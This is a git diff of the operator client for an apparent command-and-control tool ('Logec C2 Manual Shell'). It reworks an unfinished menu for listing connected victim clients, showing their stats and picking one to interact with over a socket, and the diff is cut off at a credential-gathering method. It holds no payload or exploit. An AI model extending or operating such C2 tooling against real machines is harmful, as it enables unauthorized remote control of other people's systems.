@@ -33,19 +33,19 @@ class fclient():
         ## 0 is success, like in C
         if response == 0:
             print("Connected!")
-            self.server_interact()
+            while True:
+                self.server_interact()
         else:
             print("Auth failed.")
             self.connect_to_server()
 
 
+################
+## Server interact
+################  
+
+    ##directly interacting with the server
     def server_interact(self):
-        if os.name == "nt":
-            os.system("cls")
-
-        else:
-            os.system("clear")
-
         ## This will be returned to the client later
         print(" ===== Logec C2 Manual Shell +++++\n\n")
         
@@ -61,11 +61,63 @@ class fclient():
         print("!! Clients populate on heartbeat, be patient\n\n")
         
         ## dict 
-        client_name = input("Enter a client name to interact, 'help', or 'refresh': ")
+        client_name = input("Enter a client name to interact, 'help', or 'refresh': ").lower()
 
+        ################
+        ## Home Menu
+        ################ 
+
+        if client_name == "clients":
+            print(self.server_request("clients"))
+        
+        
+        elif client_name == "refresh":
+            if os.name == "nt":
+                os.system("cls")
+
+            else:
+                os.system("clear")
+            self.client_info_fetch()
+            
+            print(
+                f"Current Clients: {self.clients}" \
+                f"Stats: {self.client_stats}"
+                  )
+
+            #self.server_interact()
+            
+        elif client_name== "help":
+            print(
+            "Home: \n" \
+            "refresh - refreshes the current connected clients \n" \
+            "stats - ' [BETA] Prints all clients stats'\n" \
+            )
+            ## change these to enter
+            #input("Type Home for Home: ")
+            #self.server_interact()
+        
+        #!!!!!!!!!!
+        ## Left Off
+        #!!!!!!!!!!!
+        #### being a PITA and not recognizing clients
+        elif (client_name in self.clients) :
+            print("DEBUG: client is in the client list!")
+            #pass
+            ## send instance/client name
+            ## server set instance to be that instance. (might be tough/run into threading issues)
+            ## run command on that instance
+
+
+            #user_input_for_client = input(f"Client (jobs for options): [{self.ip_address}]: ")
+            #print(client_interact_through_server(user_input_for_client))
+            
+            
         # get the corresponding instance from the clients dictionary and call its method
         
         ## Part of this needs to stay here, the other part needs to go back to the server
+        else:
+            print("command not found")
+        
         '''
         if client_name in self.clients:
             client_instance = self.clients[client_name]
@@ -78,17 +130,15 @@ class fclient():
 
                 else:
                     client_instance.interact(user_input_for_client)'''
-        
-        if client_name.lower() == "refresh":
-            '''if os.name == "nt":
-                os.system("cls")
 
-            else:
-                os.system("clear")'''
+################
+## Client Interact
+################  
 
-            self.server_interact()
-
-        elif client_name.lower() == "stats":
+    ## Interacting with clients via the server as a middle man
+    ## Meant to be called per message
+    def client_interact_through_server(self, client_command):
+        if client_command == "stats":
             stats_list = []
 
             for client_name, client_instance in self.clients.items():
@@ -109,41 +159,43 @@ class fclient():
                 # do something with the variable value, e.g. print it
                 #print(f"{client_name}: {variable_value}")
 
-            print(stats_list)
-            input("Type home for home: ")
-            self.server_interact()
+            return stats_list
+            #print(stats_list)
+            #input("Type home for home: ")
 
 
-        elif client_name.lower() == "clients":
-            self.server_request("clients")
-
-        elif client_name.lower() == "help":
-            print(
-            "Home: \n" \
-            "refresh - refreshes the current connected clients \n" \
-            "stats - ' [BETA] Prints all clients stats'\n" \
-            )
-            ## change these to enter
-            input("Type Home for Home: ")
-            self.server_interact()
 
         else:
-            print(f"{client_name} not found.")
-            os.system("clear")
-            self.server_interact()
+            print("command not found")
+            #print(f"{client_name} not found.")
+            #os.system("clear")
+            #self.client_interact_through_server()
+
+            
+################
+## Server Functions
+################  
+    ## grabs info and foramts it
+    def client_info_fetch(self):
+        self.clients = list(self.server_request("clients").split())
+        self.client_stats = self.server_request("stats")
 
     ## THe main interface for gettin data from the server
+    ## will handle all encoding & bs, just pass it the string
     def server_request(self, request):
         formatted_request = f"!_usercommand_!\\|/{self.username}//|\\\\{request}"
-        print(f"DEBUG: Formatted Request: {formatted_request}")
 
         if request == "clients":
+            print(f"DEBUG: Sending {formatted_request}")
             self.server.send(self.str_encode(formatted_request))
 
             ## return this eventually to the function that called it to print
-            print("waiting on response...")
-            print(self.str_decode(self.server.recv(1024)))
-    
+            print("DEBUG: waiting on response...")
+            
+            serv_response = self.str_decode(self.server.recv(1024))
+            print(f"DEBUG: Serv Response: {serv_response}")
+            return serv_response
+
     def credential_gather(self) -> list:
         ## HA yes this works! init the list with types!
         creds_list = [str, str]
